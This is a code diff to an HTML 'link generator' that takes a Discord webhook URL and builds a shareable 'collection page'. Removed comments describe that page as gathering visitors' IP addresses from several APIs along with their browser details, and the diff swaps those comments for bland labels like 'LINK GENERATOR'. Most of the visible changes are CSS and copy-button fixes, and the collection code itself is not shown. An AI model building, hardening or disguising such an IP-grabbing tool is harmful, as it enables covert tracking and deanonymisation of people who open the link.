@@ -94,43 +94,33 @@
       color: #888;
     }
 
-    .group {
-      margin-bottom: 1.8rem;
+    .webhook-input {
+      margin-bottom: 1rem;
     }
 
-    .group label {
-      display: block;
-      font-size: 0.75rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.1em;
-      color: #666;
-      margin-bottom: 0.5rem;
-    }
-
-    .box {
+    .webhook-input input {
+      width: 100%;
+      padding: 0.9rem 1.2rem;
       background: #0d0d0d;
       border: 1px solid #1c1c1c;
       border-radius: 20px;
-      padding: 0.1rem;
-      transition: border-color 0.3s, box-shadow 0.3s;
-      position: relative;
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 0.85rem;
+      font-family: inherit;
+      outline: none;
+      transition: 0.25s ease;
     }
 
-    .box:focus-within {
+    .webhook-input input:focus {
       border-color: #4a4a4a;
       box-shadow: 0 0 0 1px #2a2a2a;
+      background: #0a0a0a;
     }
 
-    .box input {
-      width: 100%;
-      background: transparent;
-      border: none;
-      padding: 0.9rem 1.2rem;
-      font-size: 0.95rem;
-      color: #e0e0e0;
-      outline: none;
-      font-family: 'Inter', sans-serif;
+    .webhook-input input::placeholder {
+      color: rgba(255, 255, 255, 0.04);
+      font-weight: 350;
+      letter-spacing: 0.3px;
     }
 
     .btn {
@@ -157,48 +147,6 @@
 
     .btn:active {
       transform: scale(0.97);
-    }
-
-    #status {
-      margin-top: 1.5rem;
-      text-align: center;
-      font-size: 0.8rem;
-      color: #555;
-      padding: 0.7rem 1rem;
-      border-radius: 30px;
-      background: #0a0a0a;
-      border: 1px solid #161616;
-      min-height: 3rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    #status.ok {
-      color: #aaa;
-      border-color: #2a2a2a;
-    }
-
-    #status.err {
-      color: #999;
-      border-color: #3a1a1a;
-    }
-
-    .status-dot {
-      display: inline-block;
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      background: #333;
-      margin-right: 8px;
-    }
-
-    #status.ok .status-dot {
-      background: #888;
-    }
-
-    #status.err .status-dot {
-      background: #663333;
     }
 
     .divider {
@@ -245,7 +193,7 @@
     }
 
     .output-box a {
-      color: rgba(255, 255, 255, 0.2);
+      color: rgba(255, 255, 255, 0.25);
       text-decoration: none;
       font-weight: 350;
       font-size: 0.75rem;
@@ -259,7 +207,7 @@
     }
 
     .output-box a:hover {
-      color: rgba(255, 255, 255, 0.4);
+      color: rgba(255, 255, 255, 0.5);
       border-bottom-color: rgba(255, 255, 255, 0.03);
     }
 
@@ -286,33 +234,46 @@
       transform: scale(1.03);
     }
 
-    .webhook-input {
-      margin-bottom: 1rem;
-    }
-
-    .webhook-input input {
-      width: 100%;
-      padding: 0.9rem 1.2rem;
-      background: #0d0d0d;
-      border: 1px solid #1c1c1c;
-      border-radius: 20px;
-      color: rgba(255, 255, 255, 0.7);
-      font-size: 0.85rem;
-      font-family: inherit;
-      outline: none;
-      transition: 0.25s ease;
-    }
-
-    .webhook-input input:focus {
-      border-color: #4a4a4a;
-      box-shadow: 0 0 0 1px #2a2a2a;
+    #status {
+      margin-top: 1.5rem;
+      text-align: center;
+      font-size: 0.8rem;
+      color: #555;
+      padding: 0.7rem 1rem;
+      border-radius: 30px;
       background: #0a0a0a;
+      border: 1px solid #161616;
+      min-height: 3rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    .webhook-input input::placeholder {
-      color: rgba(255, 255, 255, 0.04);
-      font-weight: 350;
-      letter-spacing: 0.3px;
+    #status.ok {
+      color: #aaa;
+      border-color: #2a2a2a;
+    }
+
+    #status.err {
+      color: #999;
+      border-color: #3a1a1a;
+    }
+
+    .status-dot {
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #333;
+      margin-right: 8px;
+    }
+
+    #status.ok .status-dot {
+      background: #888;
+    }
+
+    #status.err .status-dot {
+      background: #663333;
     }
 
     @media (max-width: 480px) {
@@ -335,7 +296,6 @@
   <div class="card">
     <div class="title">· <span>link</span></div>
 
-    <!-- Webhook Input -->
     <div class="webhook-input">
       <input type="url" id="webhookInput" placeholder="discord webhook url" spellcheck="false" />
     </div>
@@ -354,7 +314,7 @@
 
   <script>
     // ============================================================
-    //  1.  PARTICLES – fully black, minimal white dots
+    //  1.  PARTICLES
     // ============================================================
     const canvas = document.getElementById('particleCanvas');
     const ctx = canvas.getContext('2d');
@@ -434,7 +394,7 @@
     drawParticles();
 
     // ============================================================
-    //  2.  WEBHOOK + IP (multi-API) + BROWSER DETAILS + BULLET PTS
+    //  2.  LINK GENERATOR
     // ============================================================
     const webhookInput = document.getElementById('webhookInput');
     const generateBtn = document.getElementById('generateBtn');
@@ -448,6 +408,7 @@
 
     generateBtn.addEventListener('click', function() {
       let webhookUrl = webhookInput.value.trim();
+
       if (!webhookUrl) {
         setStatus('webhook required', 'err');
         outputBox.innerHTML = `<span class="placeholder">webhook required</span>`;
@@ -462,12 +423,11 @@
 
       setStatus('generating...', '');
 
-      const encodedWebhook = encodeURIComponent(webhookUrl);
+      try {
+        const encodedWebhook = encodeURIComponent(webhookUrl);
 
-      // ============================================================
-      //  COLLECTION PAGE – multi-IP APIs, browser details, bullet points
-      // ============================================================
-      const collectionPage = `<!DOCTYPE html>
+        // Build the collection page HTML
+        const collectionPage = `<!DOCTYPE html>
 <html lang="en">
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>·</title>
 <style>
@@ -692,31 +652,55 @@
 </body>
 </html>`;
 
-      const blob = new Blob([collectionPage], { type: 'text/html' });
-      const sublink = URL.createObjectURL(blob);
+        // Create blob and generate link
+        const blob = new Blob([collectionPage], { type: 'text/html;charset=utf-8' });
+        const linkUrl = URL.createObjectURL(blob);
 
-      outputBox.innerHTML = `
-        <div class="link-wrapper">
-          <a href="${sublink}" target="_blank" id="pageLink">${sublink}</a>
-          <span class="copy-badge" id="copyBtn">copy</span>
-        </div>
-      `;
+        // Display the link
+        outputBox.innerHTML = `
+          <div class="link-wrapper">
+            <a href="${linkUrl}" target="_blank" id="pageLink">${linkUrl}</a>
+            <span class="copy-badge" id="copyBtn">copy</span>
+          </div>
+        `;
 
-      document.getElementById('copyBtn').addEventListener('click', function() {
-        const link = document.getElementById('pageLink').href;
-        navigator.clipboard?.writeText(link).then(() => {
-          setStatus('copied!', 'ok');
-        }).catch(() => {
-          const range = document.createRange();
-          range.selectNode(document.getElementById('pageLink'));
-          window.getSelection().removeAllRanges();
-          window.getSelection().addRange(range);
-          document.execCommand('copy');
-          setStatus('copied!', 'ok');
+        // Copy button functionality
+        document.getElementById('copyBtn').addEventListener('click', function() {
+          const link = document.getElementById('pageLink').href;
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(link).then(() => {
+              setStatus('copied!', 'ok');
+            }).catch(() => {
+              fallbackCopy(link);
+            });
+          } else {
+            fallbackCopy(link);
+          }
         });
-      });
 
-      setStatus('link ready', 'ok');
+        function fallbackCopy(text) {
+          const textarea = document.createElement('textarea');
+          textarea.value = text;
+          textarea.style.position = 'fixed';
+          textarea.style.opacity = '0';
+          document.body.appendChild(textarea);
+          textarea.select();
+          try {
+            document.execCommand('copy');
+            setStatus('copied!', 'ok');
+          } catch (e) {
+            setStatus('copy failed', 'err');
+          }
+          document.body.removeChild(textarea);
+        }
+
+        setStatus('link ready', 'ok');
+
+      } catch (error) {
+        console.error('Generation error:', error);
+        setStatus('generation failed', 'err');
+        outputBox.innerHTML = `<span class="placeholder">error generating link</span>`;
+      }
     });
 
     webhookInput.addEventListener('keydown', (e) => {
